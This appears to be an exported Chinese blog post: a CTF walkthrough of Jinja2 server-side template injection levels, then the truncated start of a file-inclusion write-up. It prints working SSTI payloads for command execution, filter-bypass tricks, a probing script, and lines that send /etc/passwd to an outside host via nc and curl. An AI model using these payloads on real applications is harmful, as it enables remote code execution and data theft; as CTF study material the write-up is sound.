class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#以下是 Python 3.x 版本中的所有内置函数的列表：</span><br><br><span class="hljs-built_in">abs</span>()<br><span class="hljs-built_in">all</span>()<br><span class="hljs-built_in">any</span>()<br><span class="hljs-built_in">ascii</span>()<br><span class="hljs-built_in">bin</span>()<br><span class="hljs-built_in">bool</span>()<br><span class="hljs-built_in">breakpoint</span>()<br><span class="hljs-built_in">bytearray</span>()<br><span class="hljs-built_in">bytes</span>()<br><span class="hljs-built_in">callable</span>()<br><span class="hljs-built_in">chr</span>()<br><span class="hljs-built_in">classmethod</span>()<br><span class="hljs-built_in">compile</span>()<br><span class="hljs-built_in">complex</span>()<br><span class="hljs-built_in">delattr</span>()<br><span class="hljs-built_in">dict</span>()<br><span class="hljs-built_in">dir</span>()<br><span class="hljs-built_in">divmod</span>()<br><span class="hljs-built_in">enumerate</span>()<br><span class="hljs-built_in">eval</span>()<span class="hljs-comment">####this</span><br><span class="hljs-built_in">exec</span>()<span class="hljs-comment">####and this</span><br><span class="hljs-comment">#上面两个能够执行任意python代码，当然也就能导入os库，调用系统命令</span><br><span class="hljs-built_in">filter</span>()<br><span class="hljs-built_in">float</span>()<br><span class="hljs-built_in">format</span>()<br><span class="hljs-built_in">frozenset</span>()<br><span class="hljs-built_in">getattr</span>()<br><span class="hljs-built_in">globals</span>()<br><span class="hljs-built_in">hasattr</span>()<br><span class="hljs-built_in">hash</span>()<br><span class="hljs-built_in">help</span>()<br><span class="hljs-built_in">hex</span>()<br><span class="hljs-built_in">id</span>()<br><span class="hljs-built_in">input</span>()<br><span class="hljs-built_in">int</span>()<br><span class="hljs-built_in">isinstance</span>()<br><span class="hljs-built_in">issubclass</span>()<br><span class="hljs-built_in">iter</span>()<br><span class="hljs-built_in">len</span>()<br><span class="hljs-built_in">list</span>()<br><span class="hljs-built_in">locals</span>()<br><span class="hljs-built_in">map</span>()<br><span class="hljs-built_in">max</span>()<br><span class="hljs-built_in">memoryview</span>()<br><span class="hljs-built_in">min</span>()<br><span class="hljs-built_in">next</span>()<br><span class="hljs-built_in">object</span>()<br><span class="hljs-built_in">oct</span>()<br><span class="hljs-built_in">open</span>()<br><span class="hljs-built_in">ord</span>()<br><span class="hljs-built_in">pow</span>()<br><span class="hljs-built_in">print</span>()<br><span class="hljs-built_in">property</span>()<br><span class="hljs-built_in">range</span>()<br><span class="hljs-built_in">repr</span>()<br><span class="hljs-built_in">reversed</span>()<br><span class="hljs-built_in">round</span>()<br><span class="hljs-built_in">set</span>()<br><span class="hljs-built_in">setattr</span>()<br><span class="hljs-built_in">slice</span>()<br><span class="hljs-built_in">sorted</span>()<br><span class="hljs-built_in">staticmethod</span>()<br><span class="hljs-built_in">str</span>()<br><span class="hljs-built_in">sum</span>()<br><span class="hljs-built_in">super</span>()<br><span class="hljs-built_in">tuple</span>()<br><span class="hljs-built_in">type</span>()<br><span class="hljs-built_in">vars</span>()<br><span class="hljs-built_in">zip</span>()<br><span class="hljs-keyword">import</span>()<br></code></pre></td></tr></table></figure><p><code>__builtins__</code>：在python中，<code>__builtins__</code>是一个特殊模块，它包含了python内置的所有函数、异常对象。以一个集合的形式查看其引用，<code>__builtins__</code> 方法是做为默认初始模块出现的，可用于查看当前所有导入的内建函数。</p><p><code>__globals__</code> 是一个函数对象特有的属性，它是一个字典，记录了该函数所在文件中的全局变量的值。当函数被定义时，它会捕获所在文件的全局命名空间（global namespace），包括所有的全局变量。这些全局变量的值会被保存在 <code>__globals__</code> 属性所指向的字典中。在 Python 中，每个函数都有一个 <code>__globals__</code> 属性，它指向一个字典，包含函数所在文件的全局变量。这使得函数可以在执行时访问其所在文件的全局变量，即使它们定义在函数之外。</p><p><code>__import__()</code>：该方法用于动态加载类和函数 。如果一个模块经常变化就可以使用 <code>__import__()</code> 来动态载入，就是 <code>import</code>。语法：<code>__import__(模块名)</code></p><p><code>__init__</code>：构造函数，实例化类时自动调用</p><p>有要注意的点：</p><p>从上面的内建函数列表可以找到eval和exec这俩函数，</p><p>写脚本找有这俩函数的子类：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> html<span class="hljs-comment">#这里引入了html库是针对本题，运行返回网页内容是html实体，所以人为解码</span><br><br>url = <span class="hljs-string">&#x27;http://124.70.99.199:5003/level/1&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">500</span>):<br>    payload = <span class="hljs-string">&quot;&quot;&quot;&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[%s].__init__.__globals__.__builtins__&#125;&#125;&quot;&quot;&quot;</span>%i<br>    evalClass = <span class="hljs-string">&quot;&quot;&quot;&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[%s]&#125;&#125;&quot;&quot;&quot;</span>%i<br>    r = requests.post(url,data=&#123;<span class="hljs-string">&quot;code&quot;</span>:payload&#125;).text<br>    evalclass_r = requests.post(url,data=&#123;<span class="hljs-string">&quot;code&quot;</span>:evalClass&#125;).text<br>    r = html.unescape(r)<br>    evalclass_r = html.unescape(evalclass_r)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;eval&quot;</span> <span class="hljs-keyword">in</span> r:<br><br>        <span class="hljs-built_in">print</span>(i,end=<span class="hljs-string">&#x27;\n&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(evalclass_r)<br>        <br></code></pre></td></tr></table></figure><p>这里符合条件的子类也是相当多</p><p><img src="/2023/02/09/ssti/image-20230731005556778.png"></p><p>相当多，我们随便取个数继续构造payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>.__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">399</span>].__init__.__globals__.__builtins__[<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>)&#125;&#125;<br></code></pre></td></tr></table></figure><p>后面发现不一定要使用<code>__builtins__</code>模块，还可以试试别的模块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># __builtins__</span><br>&#123;&#123;().__class__.__base__.__subclasses__()[<span class="hljs-number">80</span>].__init__.__globals__.__builtins__[<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&#x27;cat flag&#x27;</span>).read()&#125;&#125;<br><span class="hljs-comment"># popen</span><br>&#123;&#123;().__class__.__base__.__subclasses__()[<span class="hljs-number">132</span>].__init__.__globals__[<span class="hljs-string">&#x27;popen&#x27;</span>](<span class="hljs-string">&#x27;cat flag&#x27;</span>).read()&#125;&#125;<br><span class="hljs-comment"># os</span><br>&#123;&#123;().__class__.__base__.__subclasses__()[<span class="hljs-number">213</span>].__init__.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;cat flag&#x27;</span>).read()&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/02/09/ssti/image-20230731012232999.png"></p><h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><p>被警告了</p><p><img src="/2023/02/09/ssti/image-20230731021637628.png"></p><p>这样又没事</p><p><img src="/2023/02/09/ssti/image-20230731021730919.png"></p><p>这样也可</p><p><img src="/2023/02/09/ssti/image-20230731021752614.png"></p><p>左双括号被ban了</p><p><img src="/2023/02/09/ssti/image-20230731021832024.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;% ... %&#125; for Statements <br><br>&#123;&#123; ... &#125;&#125; for Expressions to print to the template output<br><br>&#123;# ... #&#125; for Comments not included in the template output<br><br>#  ... # for Line Statements<br></code></pre></td></tr></table></figure><p>jinja2模板语法中可不止<code>&#123;&#123;&#125;&#125;</code>，还有<code>&#123;%%&#125;</code>，用于插入逻辑控制代码，<em><strong>其中的代码会在渲染模板时被执行</strong></em>，</p><p>在 Jinja2 模板引擎中，<code>&#123;%%&#125;</code> 中的控制结构包括以下几种，和解题没关系的也顺便加下，多学百益无一害：</p><ol><li><code>&#123;% if ... %&#125;` 和 `&#123;% endif %&#125;</code>：条件语句，用于根据条件执行不同的代码块。</li><li><code>&#123;% for ... %&#125;` 和 `&#123;% endfor %&#125;</code>：循环语句，用于遍历一个可迭代对象的元素。</li><li><code>&#123;% while ... %&#125;` 和 `&#123;% endwhile %&#125;</code>：循环语句，用于根据条件循环执行代码块。</li><li><code>&#123;% else %&#125;</code>：与 if 或 for 配合使用，在没有满足条件或循环结束时执行的代码块。</li><li><code>&#123;% elif ... %&#125;</code>：与 if 配合使用，用于添加额外的条件分支。</li><li><code>&#123;% set ... %&#125;</code>：变量赋值语句，用于在模板中定义变量。</li><li><code>&#123;% macro ... %&#125;` 和 `&#123;% endmacro %&#125;</code>：宏定义，用于在模板中定义可复用的代码片段。</li><li><code>&#123;% call ... %&#125;` 和 `&#123;% endcall %&#125;</code>：调用宏，用于调用已定义的宏。</li><li><code>&#123;% block ... %&#125;` 和 `&#123;% endblock %&#125;</code>：块定义，用于在模板继承中重写内容。</li><li><code>&#123;% extends ... %&#125;</code>：模板继承，用于继承其他模板，并重写其中的块内容。</li><li><code>&#123;%include ... %&#125;</code>：引入外部模板</li></ol><p>陌生的那些用一个例子说明：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;&#123;&#123; title &#125;&#125;&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>    &#123;% if user %&#125;<br>        &lt;h1&gt;Hello, &#123;&#123; user &#125;&#125;!&lt;/h1&gt;<br>    &#123;% else %&#125;<br>        &lt;h1&gt;Hello, Guest!&lt;/h1&gt;<br>    &#123;% endif %&#125;<br><br>    &#123;% macro format_name(first, last) %&#125;<br>        &#123;&#123; first &#125;&#125; &#123;&#123; last &#125;&#125;<br>    &#123;% endmacro %&#125;<br><br>    &lt;p&gt;Full Name: &#123;&#123; format_name(&#x27;John&#x27;, &#x27;Doe&#x27;) &#125;&#125;&lt;/p&gt;<br>    <br>    &#123;% macro greet(name) %&#125;<br>    &lt;h1&gt;Hello,&#123;&#123;name&#125;&#125;!&lt;/h1&gt;<br>    &#123;%endmacro%&#125;<br>    <br>    &#123;% call greet(&#x27;Jhon&#x27;) %&#125;<br>    &#123;% call greet(&#x27;Alice&#x27;) %&#125;<br><br>    &#123;% block content %&#125;<br>        &lt;p&gt;This is the default content.&lt;/p&gt;<br>    &#123;% endblock %&#125;<br><br>    &#123;% include &#x27;footer.html&#x27; %&#125;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>while，set:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;While Loop Example&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>    &#123;% set counter = 1 %&#125;<br>    &lt;ul&gt;<br>        &#123;% while counter &lt;= 5 %&#125;<br>            &lt;li&gt;Item &#123;&#123; counter &#125;&#125;&lt;/li&gt;<br>            &#123;% set counter = counter + 1 %&#125;&lt;!--注意这里要用set--&gt;<br>        &#123;% endwhile %&#125;<br>    &lt;/ul&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>最后构造payload，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">/*逻辑语句会执行，但是不输出，因此需要回带到自己vps*/<br>&#123;%if (&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[399].__init__.__globals__.__builtins__[&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /etc/passwd|nc 124.70.99.199 7890&#x27;).read()&quot;))%&#125;&#123;%endif%&#125;//nc实现回带<br>&#123;%if (&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[399].__init__.__globals__.__builtins__[&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;curl http://124.70.99.199:7890/?`cat /etc/passwd`&#x27;).read()&quot;))%&#125;&#123;%endif%&#125;//curl实现回带<br><br><br>&#123;%for i in (&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[399].__init__.__globals__.__builtins__[&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /etc/passwd|nc 124.70.99.199 7890&#x27;).read()&quot;))%&#125;&#123;%endfor%&#125;//curl实现同上<br><br>/*感觉可能的实现方式都试了一遍，最后发现set也可*/<br>&#123;%set a = (&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[399].__init__.__globals__.__builtins__[&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /etc/passwd|nc 124.70.99.199 7890&#x27;).read()&quot;))%&#125;<br></code></pre></td></tr></table></figure><p>看别人博客时发现print居然也能写进来诶，自己想了想，既然能够执行为啥不能用print呢，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;%print(&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[399].__init__.__globals__.__builtins__[&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /etc/passwd&#x27;).read()&quot;))%&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/02/09/ssti/image-20230731025126135.png"></p><h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><p>emmm，上面出了点小趣事，涉及到jinja2的渲染语句还是都打上代码块吧呜呜（，传博客的时候发现报错</p><p><img src="/2023/02/09/ssti/image-20230731024741335.png"></p><p>，小问题，都打上代码块就好了</p><p>输入1，</p><p><img src="/2023/02/09/ssti/image-20230731030014042.png"></p><p><img src="/2023/02/09/ssti/image-20230731030026544.png"></p><p>只会显示语法正确与否，不会回显，那好办，上一题回带vps的payload直接拿下来用，</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;%if (&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[399].__init__.__globals__.__builtins__[&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /etc/passwd|nc 124.70.99.199 7890&#x27;).read()&quot;))%&#125;&#123;%endif%&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/02/09/ssti/image-20230731025728066.png"></p><p>还看到了别人的姿势，</p><p><img src="/2023/02/09/ssti/image-20230731030517813.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;% for i in &#x27;&#x27;.__class__.__mro__[-1].__subclasses__() %&#125;&#123;% if i.__name__==&#x27;Popen&#x27; %&#125;&#123;&#123; i.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat /etc/passwd|nc 124.70.99.199 7890&#x27;).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;<br></code></pre></td></tr></table></figure><h3 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h3><p>中括号被过滤了，<a href="https://jinja.palletsprojects.com/en/3.1.x/templates/#variables">查Jinja官方文档</a>，variable开头就直接说了</p><p><img src="/2023/02/09/ssti/image-20230731170423110.png"></p><p>你可以使用点（ <code>.</code> ）来访问变量的属性，作为替代，也可以使用所谓的“下标”语 法（<code>[]</code>），如果点被过滤，可以用中括号绕过。</p><p>中括号被过滤了呢，这里的代码写出了一种特殊的方法<code>__getitem__</code>，用于获取foo中的item</p><p><img src="/2023/02/09/ssti/image-20230731180156155.png">我们可以用<code>__getitem__()</code>来获取字典中的键值，看了别人的博客，知道pop()方法也可以取键值，但是会删除键，不到万不得已不要用</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__().__getitem__(399).__init__.__globals__.__builtins__.__getitem__(&quot;__import__&quot;)(&#x27;os&#x27;).popen(&#x27;cat /etc/passwd&#x27;).read()&#125;&#125;<br><br>&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__().pop(399).__init__.__globals__.__builtins__.pop(&quot;__import__&quot;)(&#x27;os&#x27;).popen(&#x27;cat /etc/passwd&#x27;).read()&#125;&#125;<br><br>&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__().__getitem__(399).__init__.__globals__.get(&#x27;__builtins__&#x27;).__getitem__(&quot;__import__&quot;)(&#x27;os&#x27;).popen(&#x27;cat /etc/passwd&#x27;).read()&#125;&#125; ##get()返回指定键的值，如果值不在字典中返回default值<br><br>&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__().__getitem__(399).__init__.__globals__.setdefault(&#x27;__builtins__&#x27;).__getitem__(&quot;__import__&quot;)(&#x27;os&#x27;).popen(&#x27;cat /etc/passwd&#x27;).read()&#125;&#125;  ##setdefault(),和get()类似, 但如果键不存在于字典中，将会添加键并将值设为default<br></code></pre></td></tr></table></figure><h3 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h3><p>单双引号被过滤</p><p><img src="/2023/02/09/ssti/image-20230731183825048.png"></p><p>这个是真不会，去网上找别人的题解</p><p>引号过滤有主要两种绕过方式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">#方法一：request对象(jinja2)<br>&#123;&#123;1.__class__.__base__.__subclasses__()[64].__init__.__globals__.__builtins__[request.args.arg1](request.args.arg2).popen(request.args.arg3).read()&#125;&#125;<br>#然后GET传递a，b，c参数用于替代引号内的几样字符串<br>#?a=__import__&amp;b=os&amp;c=cat /etc/passwd<br></code></pre></td></tr></table></figure><p><img src="/2023/02/09/ssti/image-20230801020731807.png"></p><p><code>request.values</code>返回无论是GET还是POST请求的参数，当然flak框架内支持<code>request.form</code>用于传递post参数</p><p><img src="/2023/02/09/ssti/image-20230801021306517.png"></p><p><img src="/2023/02/09/ssti/image-20230801021603150.png"></p><p>cookie中传参也可以</p><p><img src="/2023/02/09/ssti/image-20230801021808956.png"></p><p>举一反三，看到别人的博客cookie可以塞，ua头里是不是也可以塞？去学了下jinja2获取ua头的方式(用法<code>request.user_agent.string</code>获取用户完整的ua字符串，<code>request.user_agent.browser</code>获取浏览器信息，<code>request.user_agent.platform</code>获取操作系统信息)，还真行</p><p><img src="/2023/02/09/ssti/image-20230801023029680.png"></p><p>那自己创一个请求头也可以喽？还真行，真有意思</p><p><img src="/2023/02/09/ssti/image-20230801023528609.png"></p><p>第二种方法，chr方法的利用，与python的chr()函数类似，用于将unicode编码转为对应字符，因为我们没法直接使用chr函数，所以需要通过<code>__builtins__</code>找到他，然后在<code>&#123;%%&#125;</code>中设置变量</p><p><code>&#123;&#123;chr(65)&#125;&#125;</code>将渲染为‘A’，如下图</p><p><img src="/2023/02/09/ssti/image-20230801030534571.png"></p><p>%2b(‘+’)用于连接两个字符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;%set chr=1.__class__.__base__.__subclasses__()[64].__init__.__globals__.__builtins__.chr%&#125;&#123;&#123;1.__class__.__base__.__subclasses__()[64].__init__.__globals__.__builtins__[chr(95)%2bchr(95)%2bchr(105)%2bchr(109)%2bchr(112)%2bchr(111)%2bchr(114)%2bchr(116)%2bchr(95)%2bchr(95)](chr(111)%2bchr(115)).popen(chr(108)%2bchr(115)).read()&#125;&#125;<br>#等价于<br>&#123;%set chr=1.__class__.__base__.__subclasses__()[64].__init__.__globals__.__builtins__.chr%&#125;&#123;&#123;1.__class__.__base__.__subclasses__()[64].__init__.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;cat /etc/passwd&#x27;).read()&#125;&#125;<br>#这里一定注意import两端的下划线呜呜呜呜，忘记了这个模块有下划线，然后又是全都是ascii码好久都没发现<br></code></pre></td></tr></table></figure><p><img src="/2023/02/09/ssti/image-20230801034608529.png"></p><p>这样挨个对ascii码太麻烦了，写个python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;cat /etc/passwd&quot;</span><br><span class="hljs-keyword">for</span> index,char <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(<span class="hljs-built_in">str</span>):<br>    joinchr = <span class="hljs-string">&#x27;%2b&#x27;</span> <span class="hljs-keyword">if</span> index &lt; <span class="hljs-built_in">len</span>(<span class="hljs-built_in">str</span>)-<span class="hljs-number">1</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;chr(&#123;&#125;)&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">ord</span>(char)),end=joinchr)<br>    <br><span class="hljs-comment">#output:chr(99)%2bchr(97)%2bchr(116)%2bchr(32)%2bchr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)</span><br><br></code></pre></td></tr></table></figure><p>写脚本的时候再学点python新知识,<code>enumerate()</code>函数，用于将一个可迭代对象(列表、元组、字符串等)转化为枚举对象，枚举对象可提供迭代对象的元素及其索引，有点像<code>foreach as</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">fruits = [<span class="hljs-string">&#x27;apple&#x27;</span>, <span class="hljs-string">&#x27;banana&#x27;</span>, <span class="hljs-string">&#x27;orange&#x27;</span>]<br><span class="hljs-keyword">for</span> index, fruit <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(fruits):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Index <span class="hljs-subst">&#123;index&#125;</span>: <span class="hljs-subst">&#123;fruit&#125;</span>&quot;</span>)<br>    <br><span class="hljs-comment">#output:Index 0: apple</span><br><span class="hljs-comment">#Index 1: banana</span><br><span class="hljs-comment">#Index 2: orange</span><br></code></pre></td></tr></table></figure><h3 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h3><p>下划线被过滤了，受上一题的启发，试试request，诶嘿，可行，这里不要用点来取值，用中括号，用点的话逻辑关系全乱了</p><p><img src="/2023/02/09/ssti/image-20230801042557864.png"></p><p>好玩</p><p><img src="/2023/02/09/ssti/image-20230801042414133.png"></p><p>去网上看了看，还有别的绕过姿势，编码绕过</p>]]></content>
    
    
    <categories>
      
      <category>常见漏洞</category>
      
      <category>Web漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>ssti</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件包含</title>
    <link href="/2023/02/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <url>/2023/02/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    
    <content type="html"><![CDATA[<h2 id="BUUCTF-WarmUp"><a href="#BUUCTF-WarmUp" class="headerlink" title="BUUCTF_ WarmUp"></a>BUUCTF_ WarmUp</h2><p>嗯。。一打开是一个滑稽脸直接一眼ctrl+u查看源代码，查找到注释提示source.php，进入source.php看到是php代码审计。</p><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20230213015433704.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">emmm</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkFile</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$page</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable">$whitelist</span> = [<span class="hljs-string">&quot;source&quot;</span>=&gt;<span class="hljs-string">&quot;source.php&quot;</span>,<span class="hljs-string">&quot;hint&quot;</span>=&gt;<span class="hljs-string">&quot;hint.php&quot;</span>];<br>            <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$page</span>) || !<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$page</span>)) &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can&#x27;t see it&quot;</span>;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br><br>            <span class="hljs-variable">$_page</span> = <span class="hljs-title function_ invoke__">mb_substr</span>(<br>                <span class="hljs-variable">$page</span>,<br>                <span 